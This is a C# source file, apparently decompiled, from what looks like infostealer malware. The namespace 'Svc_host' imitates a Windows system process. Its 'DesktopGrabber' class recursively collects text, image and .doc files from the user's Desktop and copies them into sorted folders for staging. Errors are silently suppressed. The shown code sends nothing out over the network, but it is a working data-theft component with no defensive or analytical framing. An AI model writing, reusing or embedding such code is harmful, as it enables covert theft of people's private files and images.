using System;
using System.Collections.Generic;
using System.IO;

namespace Svc_host;

public static class DesktopGrabber
{
	public static void Grab(string folderPath)
	{
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		List<FileInfo> list = FindFiles(folderPath2, "*.txt");
		List<FileInfo> list2 = FindFiles(folderPath2, "*.png");
		List<FileInfo> list3 = FindFiles(folderPath2, "*.jpg");
		List<FileInfo> list4 = FindFiles(folderPath2, "*.doc");
		Directory.CreateDirectory(folderPath + "/Images");
		Directory.CreateDirectory(folderPath + "/Txt");
		Directory.CreateDirectory(folderPath + "/Docs");
		foreach (FileInfo item in list)
		{
			File.Copy(item.FullName, folderPath + "/Txt/" + item.Name, overwrite: true);
		}
		foreach (FileInfo item2 in list2)
		{
			File.Copy(item2.FullName, folderPath + "/Images/" + item2.Name, overwrite: true);
		}
		foreach (FileInfo item3 in list3)
		{
			File.Copy(item3.FullName, folderPath + "/Images/" + item3.Name, overwrite: true);
		}
		foreach (FileInfo item4 in list4)
		{
			File.Copy(item4.FullName, folderPath + "/Docs/" + item4.Name, overwrite: true);
		}
	}

	private static List<FileInfo> FindFiles(string folder, string extension)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		List<FileInfo> list = new List<FileInfo>();
		if (directoryInfo.Exists)
		{
			try
			{
				FileInfo[] files = directoryInfo.GetFiles(extension);
				int num = 0;
				while (true)
				{
					if (num >= files.Length)
					{
						DirectoryInfo[] directories = directoryInfo.GetDirectories();
						foreach (DirectoryInfo directoryInfo2 in directories)
						{
							foreach (FileInfo item2 in FindFiles(folder + "\\" + directoryInfo2.Name, extension))
							{
								list.Add(item2);
							}
						}
						return list;
					}
					FileInfo item = files[num];
					if (list.Count >= 10)
					{
						break;
					}
					list.Add(item);
					num++;
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		return list;
	}
}
